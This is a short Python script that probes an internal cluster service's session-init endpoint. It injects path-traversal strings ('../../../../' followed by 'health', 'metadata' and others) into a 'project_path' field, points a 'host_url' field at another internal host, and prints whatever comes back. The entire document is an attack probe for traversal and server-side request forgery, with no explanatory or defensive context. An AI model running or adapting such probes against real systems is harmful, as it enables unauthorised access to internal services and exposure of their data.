import json, urllib.request, urllib.error
base='http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local/session/init'
for p in ['../../../../','../../../../health','../../../../version','../../../../api','../../../../metadata']:
 b=json.dumps({'user_id':'probe-metaserve@armorerlabs.com','host_url':'http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local','project_path':p,'force':True}).encode()
 q=urllib.request.Request(base,b,method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
 try:
  x=urllib.request.urlopen(q,timeout=8); print(p,x.status,x.read(1000).decode('utf-8','replace'))
 except urllib.error.HTTPError as e: print(p,e.code,e.read(1000).decode('utf-8','replace'))
 except Exception as e: print(p,repr(e))
